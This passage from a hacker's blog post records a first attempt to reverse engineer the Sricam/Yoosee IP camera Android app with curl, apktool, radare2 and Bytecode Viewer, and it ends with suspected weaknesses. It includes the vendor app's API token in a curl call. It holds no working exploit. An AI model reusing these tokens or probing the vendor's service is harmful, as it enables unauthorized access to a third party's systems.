&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://api1.cloudlinks.cn/Users/ThirdLogin.ashx  &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agent: Mozilla/5.0 (Linux; U; Android 2.2.1; en-us; Nexus One Build/FRG83)&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AppID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;d591b466644a0420e5f29aefb0cf0088 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AppToken&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2db6962ff0901b8ce771f20f14a651a2786086e55615f951aa0c7c9b33fc5340 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AppOS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Android &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AppName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;com.yoosee &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Language&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;eng &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PackageName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;com.yoosee &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AppVersion&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;00.23.00.03 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ApiVersion&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.1 

&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;error_code&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;14&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;参数错误&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;42-apktool&quot;&gt;4.2 APKTOOL&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;oit@ubuntu&amp;gt; ~/tools/apktool
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./apktool &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; Sricam_17.7.17_apk-dl.com.apk 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;APKTool will generate smali files from the APK. Smali is a readable format of the dalvik executable dex file. As JADX isn’t capable of disassembling all files it could be worthwile to look at the smali files. It looks like kind of assembler code.
Looking into the smali file of BasePreferenceManager.smali we recognize some constant strings:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.method static constructor &amp;lt;clinit&amp;gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;V
    .locals 14
    const/16 v9, 0x35
    const/16 v10, 0x11
    const/4 v8, 0x4
    const/4 v12, 0x1
    const/4 v1, 0x0
    const-string v2, &lt;span class=&quot;s2&quot;&gt;&quot;W#F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0013titY&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0008p&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;0016&lt;span class=&quot;se&quot;&gt;\\\u&lt;/span&gt;0005ce&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;L]+n9Z&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;0015t5k&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;0004&lt;span class=&quot;s2&quot;&gt;&quot;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;But they have no typical length for a IV or a AES key.
The strings.xml file could be very useful, as it includes nearly all constant strings, that are used in the Java apk. But doesn’t reveal anything new.&lt;/p&gt;

&lt;h3 id=&quot;43-unzip-the-apk&quot;&gt;4.3 Unzip the APK&lt;/h3&gt;

&lt;p&gt;Simply unzipping the apk will unpack it’s resources for Linking and Compiling and reveals DEX binary and the native ARM libraries.
We can use the compiled dalvic executable dex file to convert it to a smali.
We can use the dex file to repack it to a jar file. The Bytecode Viewer will do exactly this.
For now I will simply examining the shared objects files for interesting functions by using information from previous findings. I will use radare2 to examining the binaries:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;r2 libelianjni.so 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x00004b90]&amp;gt; afl
...
0x000059a8   12 290          sym.RT_AES_KeyExpansion
0x00005ad8   43 604          sym.RT_AES_Encrypt
0x00005d4c   42 540          sym.RT_AES_Decrypt
0x00005f80   12 230          sym.RT_HMAC_SHA1
0x0000606c    1 42           sym.RT_SHA1_Init
0x0000609c   15 412          sym.RT_SHA1_Hash
0x00006248    6 96           sym.RT_SHA1_Append
0x000062a8    5 174          sym.RT_SHA1_End
0x00006358    3 72           sym.RT_SHA1
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Going deeper into this lib file:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[0x0000597c]&amp;gt; s sym.elianStart
sym.createV1Packet
sym.createV2Packet
sym.RT_AES_Encrypt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Examining these functions are strongly related to using or generating AES related keys or Initialization Vectors but I wasn’t able of extracting them.&lt;/p&gt;

&lt;h3 id=&quot;44-bytecode-viewer&quot;&gt;4.4 Bytecode Viewer&lt;/h3&gt;

&lt;p&gt;Bytecode Viewer runs into the same errors as JADX and won’t give new information:&lt;/p&gt;

&lt;div class=&quot;image-container&quot;&gt;
	
&lt;div class=&quot;image-wrapper-single&quot;&gt;
    &lt;a href=&quot;http://i.imgur.com/xXLwCwn.png&quot; title=&quot;Bytecode Viewer&quot; target=&quot;_blank&quot;&gt;
	&lt;img class=&quot;image&quot; src=&quot;http://i.imgur.com/xXLwCwn.png&quot; alt=&quot;Bytecode Viewer&quot; /&gt;
    &lt;/a&gt;
    
	&lt;p class=&quot;image-caption&quot;&gt;Bytecode Viewer&lt;/p&gt;
    

&lt;/div&gt;

&lt;/div&gt;

&lt;p&gt;Bytecode Viewer combines multiple different Java decompilers. In the screenshot we can see the output of “JD-Gui”. This is the “Java Decompiler”. This will only work on native .jar files.After unzipping the apk we can find next to the library files a .dex file. We can convert with “dex2jar” the .dex file to a native Java application. Bytecode Viewer uses this mechanism but is running into the same errors.&lt;/p&gt;

&lt;h2 id=&quot;overall-security-issues-for-now&quot;&gt;Overall Security Issues (for now)&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;overall HTTP connections&lt;/li&gt;
  &lt;li&gt;probably vulnerable gSoap service&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;It was a lot of fun to examine this piece of hardware for vulnerabilties and it’s secrets. I guess, I found a lot interesting stuff but I leave with many possible courses of action that could lead into a serious exploit. This is due to lack of knowledge because it’s my first project to start into embedded security. I will doing research into Android Applications and ARM-Architecture to continue the examination in Part 2. If someone reads this blog and could give hints about going further I would be very grateful.&lt;/p&gt;</content><author><name>herrfeder</name></author><category term="iot" /><category term="hacking" /><category term="hardware" /><category term="ARM" /><summary type="html"></summary></entry></feed>